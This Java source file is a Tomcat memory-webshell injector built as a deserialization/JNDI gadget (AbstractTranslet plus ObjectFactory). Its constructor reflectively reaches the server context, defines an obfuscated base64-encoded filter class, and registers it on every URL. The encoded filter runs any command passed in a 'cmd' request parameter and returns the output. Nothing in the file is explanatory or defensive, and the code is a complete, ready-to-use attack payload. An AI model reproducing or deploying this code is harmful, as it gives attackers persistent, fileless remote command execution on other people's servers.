import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Hashtable;

public class Inject extends AbstractTranslet implements ObjectFactory {
    public StandardContext getContext() {
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
//        StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
        try {
            Field field = WebappClassLoaderBase.class.getDeclaredField("resources");
            field.setAccessible(true);
            StandardRoot standardroot = (StandardRoot)field.get(webappClassLoaderBase);
            StandardContext context = (StandardContext) standardroot.getContext();
            return context;
        }catch (Exception e) {
            return null;
        }
    }
    public Filter getFilter() throws Exception {
        String code = "yv66vgAAADQAXwoADwA0CAArCwA1ADYKADcAOAoANwA5BwA6BwA7CgA8AD0KAAcAPgoABgA/CgAGAEALAEEAQgoAQwBEBwBFBwBGBwBHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2hlbGxGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAHZGVzdHJveQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADY21kAQANU3RhY2tNYXBUYWJsZQcASAcASQcAOgEACkV4Y2VwdGlvbnMHAEoBAApTb3VyY2VGaWxlAQAQU2hlbGxGaWx0ZXIuamF2YQwAEQASBwBLDABMAE0HAE4MAE8AUAwAUQBSAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAEkMAFMAVAwAEQBVDAARAFYMAFcAWAcAWQwAWgBbBwBcDABdAF4BAAtTaGVsbEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEADgAPAAEAEAAAAAQAAQARABIAAQATAAAALwABAAEAAAAFKrcAAbEAAAACABQAAAAGAAEAAAAEABUAAAAMAAEAAAAFABYAFwAAAAEAGAAZAAEAEwAAADUAAAACAAAAAbEAAAACABQAAAAGAAEAAAAGABUAAAAWAAIAAAABABYAFwAAAAAAAQAaABsAAQABABwAEgABABMAAAArAAAAAQAAAAGxAAAAAgAUAAAABgABAAAACAAVAAAADAABAAAAAQAWABcAAAABAB0AHgACABMAAADrAAUACAAAAEgrEgK5AAMCADoEGQTGADu4AAQZBLYABToFuwAGWbsAB1kZBbYACLcACbcACjoGGQa2AAtZOgfGABEsuQAMAQAZB7YADaf/6rEAAAADABQAAAAiAAgAAAALAAoADAAPAA0AGQAOACMADwAuABEAOQASAEcAFQAVAAAAUgAIABkALgAfACAABQAuABkAIQAiAAYANgARACMAJAAHAAAASAAWABcAAAAAAEgAJQAmAAEAAABIACcAKAACAAAASAApACoAAwAKAD4AKwAkAAQALAAAABEAAv4ALgcALQcALgcAL/kAGAAwAAAABAABADEAAQAyAAAAAgAz";
        byte[] bytes = Base64.getDecoder().decode(code);

        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
        Filter filter = (Filter) clazz.newInstance();
        return filter;
    }
    public Inject() throws Exception {
        StandardContext context = getContext();
        Filter filter = getFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(filter);
        filterDef.setFilterClass(filter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        context.filterStart();
        System.out.println("注入成功");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}